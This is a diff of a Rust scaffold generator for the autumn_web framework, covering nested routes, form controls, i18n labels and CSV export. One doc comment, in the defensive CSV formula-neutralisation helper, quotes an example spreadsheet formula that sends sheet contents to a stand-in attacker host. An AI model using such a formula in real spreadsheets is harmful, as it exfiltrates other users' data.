+    csrf_field: Option<&CsrfFormField>,
+    submit_token: Option<&SubmitToken>,
+    submit_field: Option<&SubmitFormField>,
+) -> AutumnResult<Markup> {{
+    require_{parent_snake}(db, {fk}).await?;
+    let section = children_section_with(db, {fk}, page_req, changeset, state, session, csrf, csrf_field, submit_token, submit_field).await?;
+    Ok({layout_fn}(&format!("{pascal_name}s for {parent_pascal} #{{{fk}}}"), {cp_nested}flash, html! {{
+        h1 {{ "{pascal_name}s for {parent_pascal} #" ({fk}) }}
+        (section)
+        (autumn_web::a11y::Link::new(crate::routes::{parent_plural}::paths::show({fk}), "Back to {parent_pascal}"))
+    }}))
+}}
+
+/// `GET {route}` — one {parent_snake}'s {plural}, and only that {parent_snake}'s.
+///
+/// Paginated through the same `PageRequest` extractor the flat index uses:
+/// `?page=N&size=M`, clamped silently rather than 400ing.
+{nested_index_secured}#[get("{route}", name = "nested_index")]
+#[allow(clippy::too_many_arguments)]
+pub async fn nested_index(
+    {fk}: Path<i64>,
+    page_req: PageRequest,
+    mut db: Db,
+    flash: Flash,
+    autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,
+    session: autumn_web::session::Session,
+    csrf: Option<CsrfToken>,
+    csrf_field: Option<CsrfFormField>,
+    submit_token: Option<SubmitToken>,
+    submit_field: Option<SubmitFormField>,
+) -> AutumnResult<Markup> {{
+    nested_view(&mut db, *{fk}, &page_req, &Changeset::new({pascal_name}Form::default()), {flash_arg}, &state, &session, csrf.as_ref(), csrf_field.as_ref(), submit_token.as_ref(), submit_field.as_ref()).await
+}}
+
+/// `POST {route}` — create one {snake_name} under its parent {parent_snake}.
+#[secured]
+#[post("{route}", name = "nested_create")]
+pub async fn nested_create(
+    {fk}: Path<i64>,
+    flash: Flash,
+    csrf: Option<CsrfToken>,
+    csrf_field: Option<CsrfFormField>,
+    submit_token: Option<SubmitToken>,
+    submit_field: Option<SubmitFormField>,
+    mut db: Db,
+    autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,
+    session: autumn_web::session::Session,
+    body: Bytes,
+) -> AutumnResult<autumn_web::reexports::axum::response::Response> {{
+    use autumn_web::reexports::axum::response::IntoResponse as _;
+{authz_call}    let mut form = decode_form(body)?;
+    // SECURITY: the parent is the ROUTE, never the payload. The nested form
+    // renders no control for `{fk}` (see `exclude_parent_fk`), and this
+    // overwrite — before validation, before the insert — means a hand-crafted
+    // body carrying its own `{fk}` cannot re-parent the {snake_name}.
+    form.{fk} = {fk}.to_string();
+    let changeset = form.into_changeset();
+    if !changeset.is_valid() {{
+        let view = nested_view(&mut db, *{fk}, &PageRequest::default(), &changeset, {flash_arg}, &state, &session, csrf.as_ref(), csrf_field.as_ref(), submit_token.as_ref(), submit_field.as_ref()).await?;
+        return Ok((autumn_web::reexports::http::StatusCode::UNPROCESSABLE_ENTITY, view).into_response());
+    }}
+    let new = into_new(changeset.data())?;
+    require_{parent_snake}(&mut db, *{fk}).await?;
+{insert_block}    flash.success("{pascal_name} created").await;
+    Ok(autumn_web::Redirect::to(&crate::routes::{parent_plural}::paths::show(*{fk})).into_response())
+}}
+"#
+    )
 }
 
 /// The `UNIQUE_CONSTRAINTS` module-level const the generated `create`/
@@ -3921,9 +8486,60 @@ fn render_update_changeset_expr(pascal_name: &str, fields: &[Field]) -> String {
     out
 }
 
+/// Validity window of the signed attachment URLs the scaffolded show/edit views
+/// render (issue #1236). Long enough to browse a detail page and click through
+/// to the file, short enough that a copied link isn't a durable capability.
+const ATTACHMENT_URL_TTL_SECS: u64 = 300;
+
+/// Wrap the new/edit view bodies in a block expression when either needs a
+/// prelude: `option_loads` for `references` selects (issue #1146/#1750) and
+/// `edit_attachment_url_binds` for the signed attachment URLs the edit view
+/// renders (issue #1236). Both bodies splice into a GET handler AND into the
+/// matching 422 re-render, so the prelude has to travel inside the body string
+/// rather than sit in one handler — otherwise the two sites drift.
+///
+/// Only the edit body ever carries attachment binds: a new record has no
+/// stored file to render.
+fn wrap_form_bodies(
+    new_form_layout: String,
+    edit_form_layout: String,
+    option_loads: &str,
+    edit_attachment_url_binds: &str,
+    // Issue #1349: bindings only the NEW form needs — the localized resource
+    // display name its "New {Model}" title and heading interpolate. Empty
+    // without `--i18n`, so the wrapping below stays byte-identical.
+    new_form_binds: &str,
+) -> (String, String) {
+    let new_body = if option_loads.is_empty() && new_form_binds.is_empty() {
+        new_form_layout
+    } else {
+        format!("{{\n{new_form_binds}{option_loads}        {new_form_layout}\n    }}")
+    };
+    let edit_body = if option_loads.is_empty() && edit_attachment_url_binds.is_empty() {
+        edit_form_layout
+    } else {
+        format!("{{\n{option_loads}{edit_attachment_url_binds}        {edit_form_layout}\n    }}")
+    };
+    (new_body, edit_body)
+}
+
 /// Whether any field in `fields` is a file attachment.
 fn has_attachment_fields(fields: &[Field]) -> bool {
     fields.iter().any(|f| f.kind.is_attachment())
+}
+
+/// Whether the scaffold declares any `richtext` column (issue #1255).
+///
+/// Gates the `markdown` feature on the project's `autumn-web` dependency, the
+/// generated `POST /{plural}/preview/{field}` routes, and their submit-token
+/// exemption.
+fn has_rich_text_fields(fields: &[Field]) -> bool {
+    fields.iter().any(|f| f.kind.is_rich_text())
+}
+
+/// The `richtext` columns of a scaffold, in declaration order (issue #1255).
+fn rich_text_fields(fields: &[Field]) -> Vec<&Field> {
+    fields.iter().filter(|f| f.kind.is_rich_text()).collect()
 }
 
 /// Emit the `FormModel` delegation impl for the generated `{Pascal}Form`
@@ -3960,14 +8576,15 @@ fn render_form_model_impl(pascal_name: &str) -> String {
 /// - decimal columns pin the browser `step` to the column's declared scale
 ///   (the derive emits a free `step="any"`, losing the column's actual
 ///   smallest representable increment);
-/// - attachment columns are excluded from the derived list and re-appended
-///   as a hand-rolled file input plus a hidden input carrying the existing
-///   blob key — a file input can't be repopulated, and `FieldControl::File`
-///   would flip the form to `multipart/form-data` while scaffold forms stay
-///   URL-encoded (uploads go through direct-upload URLs; see
-///   docs/guide/storage.md#direct-uploads). The appended markup renders the
+/// - attachment columns are promoted to `FieldControl::File` (issue #1236).
+///   The derive sees an opaque `Blob` column and falls back to a text control;
+///   the override renders a plain `<input type="file">` (no hidden presign
+///   key) and flips the whole form to `enctype="multipart/form-data"`, which
+///   is what makes the zero-JavaScript upload work on submit. It renders the
 ///   same inline-error/ARIA skeleton as the derived controls, so changeset
-///   errors on the attachment key still surface;
+///   errors on the attachment still surface. A file input can't be
+///   repopulated, so the *currently stored* attachment is rendered next to it
+///   by the edit view (see `attachment_link`);
 /// - `references` columns are promoted to a `Select` over the referenced
 ///   table's ids (issue #1135 AC 2). The options are runtime data, so the
 ///   helper takes one `{column}_options: &[(String, String)]` parameter per
@@ -3986,7 +8603,18 @@ fn render_form_for_helper(
     pascal_name: &str,
     snake_name: &str,
     fields: &[Field],
+    // Issue #1349: relabels every control through `{snake}.field.{name}` when
+    // `--i18n` is on, and is an identity function over the derived English
+    // labels when it is off.
+    labels: &scaffold_i18n::ViewLabels,
     missing_reference_targets: &BTreeSet<String>,
+    // The Rust type of the model's `lock_version` counter (issue #1318), or
+    // `None` when the model declares no optimistic-locking column.
+    lock_version_ty: Option<&str>,
+    // The parent foreign-key column under `--belongs-to` (issue #1323), or
+    // `None` for a flat scaffold. `Some` adds the `exclude_parent_fk` flag the
+    // nested inline create form passes to drop that control.
+    parent_fk: Option<&str>,
 ) -> String {
     use std::fmt::Write as _;
     let mut extra_params = String::new();
@@ -4011,20 +8639,74 @@ fn render_form_for_helper(
                     "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::File)"
                 );
             }
+            FieldKind::Json => {
+                // Issue #1341: the derive sees an opaque `serde_json::Value`
+                // column and falls back to a single-line text control (same
+                // fallback `Attachment`'s raw `Blob` hits above) — promote it
+                // to a `<textarea>` so a real JSON object/array fits.
+                let _ = write!(
+                    builder_calls,
+                    "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::Textarea)"
+                );
+            }
             FieldKind::Enum => {
-                let placeholder = if f.nullable {
-                    "— Unset —"
+                let (placeholder_key, placeholder) = if f.nullable {
+                    ("common.select.unset", "— Unset —")
                 } else {
-                    "— Select —"
+                    ("common.select.prompt", "— Select —")
                 };
-                let mut options = format!("(\"\".into(), \"{placeholder}\".into())");
+                // `.into()` on a `&str` literal and on the `String` a `t!` call
+                // returns both land on `String`, so the emitted `vec!` element
+                // is well-typed either way.
+                let mut options = format!(
+                    "(\"\".into(), {}.into())",
+                    labels.lit(placeholder_key, placeholder)
+                );
                 for v in &f.variants {
                     let vlabel = humanize_label(v);
-                    let _ = write!(options, ", (\"{v}\".into(), \"{vlabel}\".into())");
+                    let vexpr =
+                        labels.lit(&format!("{snake_name}.field.{name}.option.{v}"), &vlabel);
+                    let _ = write!(options, ", (\"{v}\".into(), {vexpr}.into())");
                 }
                 let _ = write!(
                     builder_calls,
                     "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::Select {{ options: vec![{options}] }})"
+                );
+            }
+            FieldKind::RichText => {
+                // Issue #1255: the derive sees a plain `String` column and
+                // emits a single-line text input. A rich-text column instead
+                // renders `form::rich_text_area_htmx` — a Markdown editor with
+                // a syntax hint and an htmx live-preview pane wired to the
+                // generated `POST /{plural}/preview/{field}` endpoint. That is
+                // a whole labeled control, not a `FieldControl` variant, so it
+                // takes the same `.exclude()` + `.append()` escape hatch the
+                // constrained-field arm below uses.
+                //
+                // The token-field-aware variant is used so the preview POST's
+                // `hx-params` filter names the app's ACTUAL configured
+                // `[security.submit_token].field_name` (issue #1843), not just
+                // the default — the helper already has the `SubmitFormField`
+                // extractor in scope for `submit_token_input`.
+                // `rich_text_area_*` takes `&str` (unlike the `a11y` builders'
+                // `impl Into<String>`), so this label site borrows.
+                let label =
+                    labels.lit_ref(&format!("{snake_name}.field.{name}"), &humanize_label(name));
+                // A non-nullable column takes the `required_*` variant, exactly
+                // like every other generated control — `String` and `TEXT NOT
+                // NULL` both accept `""`, so without it an empty editor would
+                // silently persist a blank body (PR #2157 review).
+                let helper = if f.nullable {
+                    "rich_text_area_htmx_with_token_field"
+                } else {
+                    "required_rich_text_area_htmx_with_token_field"
+                };
+                let _ = write!(builder_calls, "\n        .exclude(\"{name}\")");
+                let _ = write!(
+                    appends,
+                    "\n        .append(autumn_web::form::{helper}(\
+                     changeset, \"{name}\", {label}, &paths::preview_{name}(), \
+                     submit_field.map_or(\"_submit_token\", |f| f.0.as_str())))"
                 );
             }
             FieldKind::Decimal { scale, .. } => {
@@ -4032,6 +8714,42 @@ fn render_form_for_helper(
                 let _ = write!(
                     builder_calls,
                     "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::Number {{ step: Some(\"{step}\".into()) }})"
+                );
+            }
+            // Issue #1260 AC4: a blank submission auto-derives the slug on
+            // create (see `create_new_block`'s `slug_derive_block`), so the
+            // control must NOT carry `required`/`aria-required` even though
+            // the column itself is `NOT NULL` — otherwise the browser blocks
+            // submission before that derivation logic ever runs. The derive's
+            // default `FormField.required` is driven by Rust-level
+            // nullability (always `true` here, since a slug field is never
+            // `Option<String>`), so this needs the same `.exclude()` +
+            // `.append()` escape hatch the other schema-specific overrides
+            // use, minus the `required_builders` those emit.
+            FieldKind::Slug => {
+                let label =
+                    labels.lit(&format!("{snake_name}.field.{name}"), &humanize_label(name));
+                let _ = write!(builder_calls, "\n        .exclude(\"{name}\")");
+                let _ = write!(
+                    appends,
+                    "\n        .append(html! {{\n            \
+                     @let errors = changeset.errors_for(\"{name}\");\n            \
+                     div id=\"{name}-field\" class=\"autumn-field\" {{\n                \
+                     (autumn_web::a11y::TextField::new(\"{name}\")\n                    \
+                     .label({label})\n                    \
+                     .label_class(\"autumn-field__label\")\n                    \
+                     .input_type(\"text\")\n                    \
+                     .value(changeset.field_value(\"{name}\").unwrap_or_default())\n                    \
+                     .class(if errors.is_empty() {{ \"autumn-field__input\" }} else {{ \"autumn-field__input autumn-field__input--invalid\" }})\n                    \
+                     .aria_invalid(!errors.is_empty())\n                    \
+                     .described_by(if errors.is_empty() {{ \"\" }} else {{ \"{name}-error\" }}))\n                \
+                     @if !errors.is_empty() {{\n                    \
+                     div id=\"{name}-error\" role=\"alert\" class=\"autumn-field__errors\" {{\n                        \
+                     @for error in errors {{ p class=\"autumn-field__error\" {{ (error) }} }}\n                    \
+                     }}\n                \
+                     }}\n            \
+                     }}\n        \
+                     }})"
                 );
             }
             FieldKind::References => {
@@ -4046,20 +8764,58 @@ fn render_form_for_helper(
                 if missing_reference_targets.contains(name) {
                     continue;
                 }
-                let placeholder = if f.nullable {
-                    "— Unset —"
+                let (placeholder_key, placeholder) = if f.nullable {
+                    ("common.select.unset", "— Unset —")
                 } else {
-                    "— Select —"
+                    ("common.select.prompt", "— Select —")
                 };
+                let placeholder_expr = labels.expr(
+                    placeholder_key,
+                    placeholder,
+                    &format!("\"{placeholder}\".to_string()"),
+                    &[],
+                );
                 let _ = write!(extra_params, ",\n    {name}_options: &[(String, String)]");
                 let _ = write!(
                     preludes,
-                    "    let mut {name}_select = vec![(String::new(), \"{placeholder}\".to_string())];\n    \
+                    "    let mut {name}_select = vec![(String::new(), {placeholder_expr})];\n    \
                      {name}_select.extend({name}_options.iter().cloned());\n"
                 );
                 let _ = write!(
                     builder_calls,
                     "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::Select {{ options: {name}_select }})"
+                );
+            }
+            // A nullable `bool` renders as a tri-state `<select>` so `NULL`
+            // stays reachable, and the derive fills it with hardcoded
+            // `— Unset —` / `Yes` / `No` (`autumn-macros/src/model.rs`'s
+            // `form_control_tokens`). Those are user-facing strings this flag
+            // is supposed to have claimed: without the override they survive
+            // untranslated in every create and edit form, next to a field
+            // label that IS translated. The same `override_field` escape hatch
+            // the enum arm uses replaces them, keeping the derive's `""` /
+            // `"true"` / `"false"` values so form parsing is unaffected.
+            //
+            // Only under `--i18n`: with the flag off the derived control is
+            // already right, and emitting an override would change output the
+            // rest of this module keeps byte-identical.
+            FieldKind::Bool if f.nullable && labels.enabled() => {
+                let mut options = format!(
+                    "(\"\".into(), {}.into())",
+                    labels.lit("common.select.unset", "— Unset —")
+                );
+                for (value, key, english) in
+                    [("true", "common.yes", "Yes"), ("false", "common.no", "No")]
+                {
+                    let _ = write!(
+                        options,
+                        ", (\"{value}\".into(), {}.into())",
+                        labels.lit(key, english)
+                    );
+                }
+                let _ = write!(
+                    builder_calls,
+                    "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::Select {{ options: vec![{options}] }})"
                 );
             }
             // A `String`/`Text`/numeric field carrying DSL constraint
@@ -4073,7 +8829,8 @@ fn render_form_for_helper(
             // inline-error/ARIA skeleton matches the derived controls.
             _ => {
                 if let Some((input_type, _)) = html5_constraint_spec(f) {
-                    let label = humanize_label(name);
+                    let label =
+                        labels.lit(&format!("{snake_name}.field.{name}"), &humanize_label(name));
                     let _ = write!(builder_calls, "\n        .exclude(\"{name}\")");
                     if matches!(f.kind, FieldKind::Text) && input_type == "text" {
                         // A `text` DSL column with a length/plain constraint is a
@@ -4112,7 +8869,7 @@ fn render_form_for_helper(
                              @let errors = changeset.errors_for(\"{name}\");\n            \
                              div id=\"{name}-field\" class=\"autumn-field\" {{\n                \
                              (autumn_web::a11y::TextArea::new(\"{name}\")\n                    \
-                             .label(\"{label}\")\n                    \
+                             .label({label})\n                    \
                              .label_class(\"autumn-field__label\")\n                    \
                              .value(changeset.field_value(\"{name}\").unwrap_or_default())\n                    \
                              {constraint_builders}{required_builders}\n                    \
@@ -4149,7 +8906,7 @@ fn render_form_for_helper(
                              @let errors = changeset.errors_for(\"{name}\");\n            \
                              div id=\"{name}-field\" class=\"autumn-field\" {{\n                \
                              (autumn_web::a11y::TextField::new(\"{name}\")\n                    \
-                             .label(\"{label}\")\n                    \
+                             .label({label})\n                    \
                              .label_class(\"autumn-field__label\")\n                    \
                              .input_type(\"{input_type}\")\n                    \
                              .value(changeset.field_value(\"{name}\").unwrap_or_default())\n                    \
@@ -4191,8 +8948,67 @@ fn render_form_for_helper(
         for name in &sm_field_names {
             let _ = write!(excludes, "\n        form = form.exclude(\"{name}\");");
         }
-        format!("\n    if exclude_state_fields {{{excludes}\n    }}\n    ")
+        // Ends at a newline, not at the next line's indent: the template
+        // supplies that. (Before #1323 the trailing indent stacked with the
+        // template's, pushing the following comment out to 8 spaces.)
+        format!("\n    if exclude_state_fields {{{excludes}\n    }}\n")
     };
+    // Issue #1318: the optimistic-locking version travels as a hidden field
+    // INSIDE the form, so it must be injected here rather than around the
+    // helper's call — `form_for` renders the whole `<form>` element. The edit
+    // call passes `Some(version)` and the create call `None`: a row that does
+    // not exist yet has no version to guard against. A model with no
+    // `lock_version` column emits neither the parameter nor the block, keeping
+    // the pre-#1318 helper byte-identical.
+    let lock_version_block = lock_version_ty.map_or_else(String::new, |ty| {
+        let _ = write!(extra_params, ",\n    lock_version: Option<{ty}>");
+        // Prepended AFTER the submit token above, so the token stays the very
+        // first field in the URL-encoded body: `prepend` pushes onto a list
+        // rendered in call order, and `SubmitTokenLayer` only scans the body's
+        // first chunk (issue #1360).
+        "    if let Some(version) = lock_version {\n        \
+         form = form.prepend(html! { input type=\"hidden\" name=\"lock_version\" value=(version); });\n    \
+         }\n    "
+            .to_owned()
+    });
+    // Issue #1323: the nested inline create form must not offer the parent
+    // foreign key as an editable control — the parent is the URL, and the nested
+    // create handler sets the column from the path either way. The helper is
+    // shared by the flat create/edit forms (which keep the belongs_to select from
+    // #1146) and the nested form, so it takes a flag: the nested call passes
+    // `true`, every other call `false`. A scaffold with no `--belongs-to` emits
+    // neither the parameter nor the block.
+    //
+    // Placed AFTER the state-machine exclusion and BEFORE the submit-token
+    // prepend, so both exclusions read together and neither disturbs the
+    // token's position at the front of the form (issue #1360).
+    let parent_fk_block = parent_fk.map_or_else(String::new, |name| {
+        let _ = write!(extra_params, ",\n    exclude_parent_fk: bool");
+        format!("    if exclude_parent_fk {{\n        form = form.exclude(\"{name}\");\n    }}\n")
+    });
+    // Issue #1349: the helper renders every labeled control, so with `--i18n` it
+    // takes the request's locale. By value for the same reason `show_view` does:
+    // `t!` expands to `Locale::t(&locale, …)`, which a `&Locale` binding would
+    // turn into a `&&Locale`.
+    let form_for_locale_param = if labels.enabled() {
+        "locale: Locale,\n    "
+    } else {
+        ""
+    };
+    // Relabel every control the `FormModel` derive renders. The derive humanizes
+    // the column name into Title Case; `.override_label` swaps in the `t!`
+    // lookup for the SAME key the index header and show row use, so one
+    // translation serves all three surfaces.
+    if labels.enabled() {
+        for f in fields {
+            let name = &f.name;
+            let _ = write!(
+                builder_calls,
+                "\n        .override_label(\"{name}\", {})",
+                labels.lit(&format!("{snake_name}.field.{name}"), &humanize_label(name))
+            );
+        }
+    }
     format!(
         "/// Render the create/edit form in a single `form_for` call (issue #1135).\n\
          ///\n\
@@ -4201,8 +9017,9 @@ fn render_form_for_helper(
          /// column requires no edits here — any enum/decimal/attachment overrides\n\
          /// below are the only schema-specific lines, and regeneration maintains\n\
          /// them.\n\
+         #[allow(clippy::too_many_arguments)]\n\
          fn {snake_name}_form_for(\n    \
-         changeset: &Changeset<{pascal_name}Form>,\n    \
+         {form_for_locale_param}changeset: &Changeset<{pascal_name}Form>,\n    \
          action: String,\n    \
          submit_label: &str,\n    \
          csrf: Option<&CsrfToken>,\n    \
@@ -4212,12 +9029,12 @@ fn render_form_for_helper(
          ) -> Markup {{\n\
          {preludes}    \
          let mut form = autumn_web::form::form_for(changeset, action, \"post\")\n        \
-         .submit_label(submit_label){builder_calls}{appends};\n{sm_exclude_block}    \
+         .submit_label(submit_label){builder_calls}{appends};\n{sm_exclude_block}{parent_fk_block}    \
          // Emit the one-time submit token at the FRONT of the form (issue #1360):\n    \
          // `SubmitTokenLayer` only scans the first chunk of the URL-encoded body,\n    \
          // so a large earlier textarea could otherwise push an appended token past\n    \
          // the scan cap and leave duplicate submits unguarded.\n    \
-         form = form.prepend(submit_token_input(submit_token, submit_field));\n    \
+         form = form.prepend(submit_token_input(submit_token, submit_field));\n{lock_version_block}    \
          if let Some(csrf) = csrf {{\n        \
          form = form.csrf(csrf.token());\n    \
          }}\n    \
@@ -4452,7 +9269,27 @@ fn render_changeset_form_inputs(
         // shipped `autumn_web::form` helpers can't express; render it as raw
         // markup instead so the live path matches the standard path (#1750).
         let constraint = html5_constraint_spec(f);
-        let line = if f.kind.is_reference() && reference_select_names.contains(name.as_str()) {
+        let line = if f.kind.is_rich_text() {
+            // Issue #1255: identical control to the standard `form_for` path —
+            // the Markdown editor with its htmx live preview. A rich-text
+            // column never takes the inline-*validation* htmx path: its wrapper
+            // already owns an `hx-post` (the preview), and a second one would
+            // fight it for the same element.
+            //
+            // `.as_ref()` because the handler owns an `Option<SubmitFormField>`
+            // here (the `form_for` helper takes an `Option<&…>` instead) — two
+            // rich-text columns in one form would otherwise use a moved value.
+            let helper = if f.nullable {
+                "rich_text_area_htmx_with_token_field"
+            } else {
+                "required_rich_text_area_htmx_with_token_field"
+            };
+            format!(
+                "(autumn_web::form::{helper}(&{cv}, \"{name}\", \
+                 \"{label}\", &paths::preview_{name}(), \
+                 submit_field.as_ref().map_or(\"_submit_token\", |f| f.0.as_str())))"
+            )
+        } else if f.kind.is_reference() && reference_select_names.contains(name.as_str()) {
             // belongs_to parent dropdown (issue #1146), restored in the
             // `--live-validation` per-field path (issue #1750).
             render_live_reference_select(f, cv)
@@ -4526,6 +9363,16 @@ fn render_changeset_form_inputs(
                 ),
                 (FieldKind::NaiveDateTime | FieldKind::DateTime, true) => {
                     format!("(autumn_web::form::datetime_input(&{cv}, \"{name}\", \"{label}\"))")
+                }
+                // Issue #1341: a real `<textarea>`, not the derived control's
+                // single-line text input fallback. There is no
+                // `required_textarea_input` helper (textarea has never had a
+                // required variant, unlike text/number/datetime/select), so
+                // both nullable and non-nullable route through the same call
+                // — the server-side JSON parse in `into_new` still 400s a
+                // blank required field.
+                (FieldKind::Json, _) => {
+                    format!("(autumn_web::form::textarea_input(&{cv}, \"{name}\", \"{label}\"))")
                 }
                 (FieldKind::Enum, _) => {
                     let placeholder = if f.nullable {
@@ -4941,15 +9788,22 @@ fn cell_value_expr(field: &Field) -> String {
             )
         }
         // Nullable String/Text: use as_deref to avoid heap allocation.
-        (true, FieldKind::String | FieldKind::Text) => {
+        // `RichText` joins them: an index cell renders the Markdown SOURCE as
+        // escaped text (maud's `Render` impl escapes it), never rendered
+        // markup — a table cell has no business carrying block-level HTML, and
+        // escaped source is inherently safe. The rendered form lives on the
+        // show page (see `render_show_property_rows`).
+        (true, FieldKind::String | FieldKind::Text | FieldKind::RichText) => {
             format!("row.{name}.as_deref().unwrap_or_default()")
         }
         // Nullable: Option<T> — no Render impl; unwrap to String.
         (true, _) => format!("row.{name}.as_ref().map(ToString::to_string).unwrap_or_default()"),
         // Non-nullable Bytea: Cow<str> does implement Render.
         (false, FieldKind::Bytea) => format!("String::from_utf8_lossy(&row.{name})"),
-        // String/Text: &String implements Render via deref coercion.
-        (false, FieldKind::String | FieldKind::Text) => format!("&row.{name}"),
+        // String/Text/RichText: &String implements Render via deref coercion.
+        (false, FieldKind::String | FieldKind::Text | FieldKind::RichText) => {
+            format!("&row.{name}")
+        }
         // Numerics (i32, i64, f32, f64): implement Render directly.
         (false, FieldKind::I32 | FieldKind::I64 | FieldKind::F32 | FieldKind::F64) => {
             format!("row.{name}")
@@ -4959,20 +9813,245 @@ fn cell_value_expr(field: &Field) -> String {
     }
 }
 
+/// The `String`-producing expression for one column's cell in the generated
+/// `CsvSchema::to_csv_record` (issue #1315).
+///
+/// Sibling of [`cell_value_expr`], which produces a Maud-renderable value for a
+/// table cell. A CSV record is a `Vec<String>`, so every arm here must land on
+/// an owned `String` — and, per AC7, a NULL column must land on the EMPTY
+/// string, never the literal `"None"` a `{:?}` of an `Option` would print.
+///
+/// RFC 4180 quoting is deliberately NOT applied here: `export_csv` writes RFC
+/// 4180, so a value carrying a comma, a double quote or a newline is quoted and
+/// escaped by the writer. Pre-quoting would double-escape it.
+///
+/// Spreadsheet FORMULA neutralization is a different problem and IS applied
+/// here, because RFC 4180 says nothing about it: every column whose value can
+/// carry attacker-supplied text is wrapped in the emitted `csv_text_cell`
+/// helper. See [`csv_kind_is_text`] for which kinds those are.
+fn csv_value_expr(field: &Field) -> String {
+    let name = &field.name;
+    let raw = match (field.nullable, field.kind) {
+        // Attachment is always `Option<Blob>`. `Blob` has no `Display`, and the
+        // index's "attachment"/"—" presence marker is useless in a spreadsheet —
+        // export the store KEY, the one value that finds the file again.
+        (_, FieldKind::Attachment) => {
+            format!("self.{name}.as_ref().map(|blob| blob.key.clone()).unwrap_or_default()")
+        }
+        // `Vec<u8>` has no `Display` either. Lossy UTF-8 matches what the index
+        // and show views already render for the column.
+        (true, FieldKind::Bytea) => format!(
+            "self.{name}.as_ref().map(|bytes| String::from_utf8_lossy(bytes).into_owned()).unwrap_or_default()"
+        ),
+        (false, FieldKind::Bytea) => format!("String::from_utf8_lossy(&self.{name}).into_owned()"),
+        // Already a `String`: clone rather than round-trip through `Display`.
+        // `Enum` is excluded — its Rust type is the generated enum, not a
+        // `String` (see `Field::rust_type`) — and so falls to the arms below.
+        (true, FieldKind::String | FieldKind::Text | FieldKind::RichText | FieldKind::Slug) => {
+            format!("self.{name}.clone().unwrap_or_default()")
+        }
+        (false, FieldKind::String | FieldKind::Text | FieldKind::RichText | FieldKind::Slug) => {
+            format!("self.{name}.clone()")
+        }
+        // Every remaining kind is `Display` (numerics, bool, Uuid, chrono,
+        // Decimal, the generated enums, and `references` foreign keys).
+        (true, _) => format!("self.{name}.as_ref().map(ToString::to_string).unwrap_or_default()"),
+        (false, _) => format!("self.{name}.to_string()"),
+    };
+    if csv_kind_is_text(field.kind) {
+        format!("csv_text_cell({raw})")
+    } else {
+        raw
+    }
+}
+
+/// Whether a column's exported value can carry arbitrary user-supplied text,
+/// and so must go through the emitted `csv_text_cell` formula guard (#1315).
+///
+/// The closed set here is the point: a numeric, boolean, UUID, timestamp or
+/// `Decimal` column is rendered by Rust's `Display` from a typed value, so it
+/// cannot begin with `=`/`+`/`@` — and guarding it anyway would prefix a
+/// legitimate negative number (`-5` → `'-5`) and break the spreadsheet's own
+/// parsing. `Enum` is a generated Rust enum whose variants are compile-time
+/// idents, so it is closed-set too. `Bytea` and `Attachment` are included: the
+/// first is lossy UTF-8 of arbitrary bytes, and the second is a store key whose
+/// tail is a browser-supplied filename. `Json` is included defensively too
+/// (issue #1341): its rendered text is *usually* self-quoting JSON (an
+/// object/array/string literal always starts with `{`/`[`/`"`, never
+/// `=`/`+`/`@`), except a bare top-level negative number (`-5`), which — like
+/// the excluded numeric kinds — would be a false-positive guard, but here
+/// there's no legitimate spreadsheet arithmetic on a JSON column to protect,
+/// so guarding costs nothing and stays consistent with the arbitrary,
+/// user-controlled data this field type exists for.
+const fn csv_kind_is_text(kind: FieldKind) -> bool {
+    matches!(
+        kind,
+        FieldKind::String
+            | FieldKind::Text
+            | FieldKind::RichText
+            | FieldKind::Slug
+            | FieldKind::Bytea
+            | FieldKind::Attachment
+            | FieldKind::Json
+    )
+}
+
+/// The `csv_text_cell` helper the generated `to_csv_record` wraps every
+/// text-backed column in (issue #1315).
+///
+/// Emitted once per routes module, immediately above the `CsvSchema` impl.
+const CSV_TEXT_CELL_HELPER: &str = "\n\n\
+    /// Neutralize a spreadsheet formula in an exported text cell.\n\
+    ///\n\
+    /// RFC 4180 — which `export_csv` implements — governs commas, quotes and\n\
+    /// newlines, and says nothing about formulas. Excel and LibreOffice evaluate a\n\
+    /// cell beginning `=`, `+`, `-`, `@`, TAB or CR as a formula EVEN INSIDE\n\
+    /// QUOTES, so a row someone else typed (`=HYPERLINK(\"https://evil.example/?\"&A2,\"report\")`,\n\
+    /// `=WEBSERVICE(..)`) can exfiltrate the rest of the sheet when a colleague\n\
+    /// opens the download. Prefixing an apostrophe makes the spreadsheet treat the\n\
+    /// value as literal text; the apostrophe is not part of the stored data and is\n\
+    /// not shown in the cell.\n\
+    ///\n\
+    /// Applied only to TEXT-backed columns. Numeric, boolean, UUID, timestamp and\n\
+    /// enum columns are rendered from typed values by `Display`, so they cannot\n\
+    /// carry a formula — and guarding them would corrupt a negative number.\n\
+    ///\n\
+    /// Delete the `csv_text_cell(..)` wrappers below if you would rather export\n\
+    /// values byte-for-byte and never open the file in a spreadsheet.\n\
+    fn csv_text_cell(value: String) -> String {\n    \
+    if value.starts_with(['=', '+', '-', '@', '\\t', '\\r']) {\n        \
+    let mut guarded = String::with_capacity(value.len() + 1);\n        \
+    guarded.push('\\'');\n        \
+    guarded.push_str(&value);\n        \
+    guarded\n    \
+    } else {\n        \
+    value\n    \
+    }\n\
+    }";
+
+/// Emit the `impl CsvSchema for {Pascal} { … }` block the export route streams
+/// through `export_csv` (issue #1315).
+///
+/// Columns are `id`, every scaffolded column in declaration order, then the
+/// model's always-present `created_at` — the same COLUMN SET (and order) the
+/// `show` view renders, which is a superset of the index table's (a
+/// `--default`ed column is dropped from the form and the table, but it is still
+/// data an author downloading a spreadsheet wants).
+///
+/// The VALUES can differ from `show`'s for two kinds, deliberately: a
+/// `references` column exports the raw foreign key rather than the parent label
+/// the view resolves (an id round-trips back through `import_csv`; a label does
+/// not, and resolving one per row would be an N+1 inside the export loop), and
+/// an `Attachment` exports the blob's storage key rather than a signed URL that
+/// would have expired by the time anyone opened the file.
+///
+/// `fields` must be the model's DECLARED columns — the list before
+/// [`augment_fields_for_soft_delete`] appends `deleted_at`. Under
+/// `--soft-delete` the model struct does carry a `deleted_at` field, but the
+/// export deliberately omits it: `list`/`list_scoped` filter
+/// `deleted_at IS NULL`, so the column is NULL for every row that can reach the
+/// export, and a column that is always blank is noise in a spreadsheet.
